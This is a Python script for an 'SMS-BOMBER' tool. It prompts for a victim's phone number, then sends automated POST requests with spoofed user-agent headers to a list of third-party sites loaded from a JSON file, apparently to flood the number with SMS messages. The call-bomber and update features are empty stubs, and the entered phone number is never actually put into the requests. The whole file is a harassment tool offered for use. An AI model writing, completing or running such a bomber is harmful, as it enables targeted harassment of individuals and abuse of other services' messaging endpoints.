import requests
import fake_useragent
import fake_headers
import json
import time
import random
from art import tprint
import os
import sys


proxy_bool = False
sites_for_bombing = []

def drow_main_menu():
    os.system("clear")
    print("-"*30 + " by p4sh4bsc " + "-"*30)
    tprint("SMS-BOMBER")
    print("-"*30 + " by p4sh4bsc " + "-"*30)
    print()
    print("00 - sms bomber")
    print("01 - call bomber")
    print("02 - update bomber")
    print("99 - exit")

def drow_logo():
    os.system("clear")
    print("-"*30 + " by p4sh4bsc " + "-"*30)
    tprint("SMS-BOMBER")
    print("-"*30 + " by p4sh4bsc " + "-"*30)
    print()

def sms_bomber():
    drow_logo()
    phone_number = input("Enter phone number (+79123456789): ")

    use_proxy = input("Use proxy [Y]es or [N]o: ")
    if use_proxy == "Y":
        proxy_bool = True
    elif use_proxy == "N":
        proxy_bool = False
    else:
        print("You enter wrong command, proxy well be disabled")

    #### reading json file with sites ####
    with open('./json_files/sms.json') as f:
        templates = json.load(f)


    for section, commands in templates.items():
        sites_for_bombing.append(section)
    
    for site in enumerate(sites_for_bombing):
        
        try:
            ua = fake_useragent.UserAgent()
            random_ua = ua.random

            url = templates[site[1]]["url"]
            data_for_json = templates[site[1]]["data"]
            header = fake_headers.Headers(headers=True)
            headers = header.generate()
            
            r = requests.post(url = url, json = data_for_json, headers = headers)
            

            if str(r) == '<Response [200]>':
                print(f"{site[0]} Sms successfully send")
            else:
                print(f"{site[0]} I cant send this sms")

        except Exception as ex:
            print("Error while sending sms")
            print(ex)

def call_bomber():
    pass

def update_bomber():
    pass


def main():
    drow_main_menu()
    command = input("\nEnter command: ")
    
    if command == "00":
        sms_bomber()
    elif command == "01":
        call_bomber()
    elif command == "02":
        update_bomber()
    elif command == "99":
        os.system("clear")
        exit()
    else:
        os.system("clear")
        main()

    

if __name__ == "__main__":
    main()

